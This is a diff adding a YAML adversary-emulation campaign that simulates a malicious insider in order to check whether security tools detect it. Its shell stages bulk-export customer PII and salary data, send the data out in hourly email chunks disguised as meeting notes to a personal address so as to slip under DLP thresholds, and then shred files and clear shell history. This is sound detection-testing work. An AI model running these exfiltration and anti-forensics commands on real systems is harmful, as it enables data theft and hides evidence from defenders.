@@ -1,0 +1,123 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: insider-threat
+  adversary: insider
+  description: "Insider threat simulation — replicate patterns of a malicious insider performing unauthorized data access, privilege abuse, and covert exfiltration during normal work hours."
+  objective: "Validate detection of insider threat indicators including abnormal data access volumes, off-hours activity, privilege abuse, and slow-drip exfiltration."
+  mitre_version: "15.1"
+  severity: high
+  tags: [insider-threat, data-access, privilege-abuse, slow-exfil, ueba]
+  authors: ["ThreatEcho"]
+  created: "2025-01-12"
+  modified: "2025-07-05"
+
+variables:
+  target_database: "postgresql://db.corp.example.com:5432/customer_data"
+  sharepoint_url: "https://corp.sharepoint.com/sites/finance"
+  personal_cloud: "https://drive.personal.example.com"
+
+stages:
+  - id: abnormal-data-access
+    name: Abnormal Data Access Volume
+    technique: T1530
+    tactic: collection
+    description: "Access significantly more database records than the user's normal baseline — classic insider pre-exfil behavior."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          # Simulate bulk database query far exceeding normal analyst volume
+          psql "{{target_database}}" -c \
+            "SELECT customer_id, full_name, email, ssn_hash, account_balance FROM customers LIMIT 50000" \
+            -o /tmp/customer_export.csv --csv
+    expect:
+      telemetry: [database_query, file_write]
+      detections: [abnormal_query_volume, bulk_pii_access, baseline_deviation_alert, sensitive_table_mass_read]
+    on_failure: continue
+
+  - id: cross-department-access
+    name: Cross-Department Data Access
+    technique: T1213.002
+    tactic: collection
+    description: "Access SharePoint sites and documents outside the user's normal department scope."
+    depends_on: [abnormal-data-access]
+    execute:
+      type: http
+      target: "{{sharepoint_url}}/_api/web/lists/getbytitle('Confidential')/items"
+      args:
+        method: GET
+        header_accept: "application/json;odata=verbose"
+    expect:
+      telemetry: [api_call, file_access]
+      detections: [cross_department_access, out_of_scope_sharepoint, unusual_document_access_pattern]
+    on_failure: continue
+
+  - id: privilege-abuse
+    name: Legitimate Privilege Abuse
+    technique: T1078.002
+    tactic: privilege-escalation
+    description: "Use legitimately granted admin privileges for unauthorized purposes — accessing systems outside job scope."
+    depends_on: [cross-department-access]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          # Use admin access to export HR salary data (outside normal job function)
+          psql "postgresql://db.corp.example.com:5432/hr_systems" -c \
+            "SELECT employee_id, name, salary, bonus, equity_grants FROM compensation WHERE department != 'Engineering'" \
+            -o /tmp/salary_data.csv --csv
+    expect:
+      telemetry: [database_query, file_write]
+      detections: [privilege_abuse_detected, out_of_role_database_access, hr_data_bulk_export]
+    on_failure: continue
+
+  - id: slow-drip-exfil
+    name: Slow-Drip Exfiltration
+    technique: T1048.002
+    tactic: exfiltration
+    description: "Exfiltrate data in small chunks over extended periods to stay under volume-based DLP thresholds."
+    depends_on: [privilege-abuse]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          # Split into small chunks that individually fall below DLP threshold
+          split -l 100 /tmp/customer_export.csv /tmp/chunk_
+          for chunk in /tmp/chunk_*; do
+            # Disguise as normal email attachment
+            curl -s -X POST "https://mail.corp.example.com/api/send" \
+              -H "Content-Type: multipart/form-data" \
+              -F "to=personal@example.com" \
+              -F "subject=Meeting Notes $(date +%Y-%m-%d)" \
+              -F "attachment=@${chunk};filename=notes.csv"
+            sleep 3600  # One chunk per hour
+          done
+    expect:
+      telemetry: [email_sent, network_connection, file_read]
+      detections: [slow_exfiltration_pattern, repeated_small_transfers, personal_email_attachment_anomaly, dlp_evasion_technique]
+    on_failure: continue
+
+  - id: evidence-destruction
+    name: Evidence Destruction
+    technique: T1070.004
+    tactic: defense-evasion
+    description: "Delete local copies of exported data and clear command history to cover tracks."
+    depends_on: [slow-drip-exfil]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          shred -u /tmp/customer_export.csv /tmp/salary_data.csv /tmp/chunk_* 2>/dev/null
+          history -c && history -w
+          # Clear recent documents list
+          rm -rf ~/.local/share/recently-used.xbel 2>/dev/null
+    expect:
+      telemetry: [file_deletion, process_creation]
+      detections: [secure_file_deletion, history_clearing, evidence_tampering]
+    on_failure: continue
